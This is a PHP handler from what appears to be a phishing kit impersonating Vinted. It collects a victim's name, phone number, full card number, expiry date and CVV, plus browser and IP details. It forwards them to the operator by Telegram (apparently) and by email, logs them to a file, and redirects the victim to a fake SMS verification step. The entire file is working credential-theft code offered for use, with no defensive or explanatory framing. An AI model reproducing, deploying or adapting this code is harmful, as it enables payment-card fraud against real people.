<?php
error_reporting(0);
if(isset($_POST['Prenom']) ){
include "../config.php";
include "inc/funcs.php";




$subject = "[VINTED] [CC] INFO from $ip";

$info1 = $_POST['Prenom'];
$info2 = $_POST['Nom'];
$info3 = $_POST['ntel'];
$info4 = $_POST['crdtyp'];
$info5 = $_POST['cardNumber'];
$info6 = $_POST['expDate'];
$info7 = $_POST['verificationCode'];
$info8 = $_POST['aNom'];
$info9 = $_POST['aPrix'];




$message = "Prenom: $info1\nNom: $info2\nntel: $info3\ncrdtyp: $info4\ncardNumber : $info5\nexpDate : $info6\nverificationCode : $info7\naNom : $info8\naPrix : $info9\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../sms-auth0.php\" />";
}
else{

	echo "<meta http-equiv=\"Refresh\" content=\"0; url=../card.php\" />";
}
?>
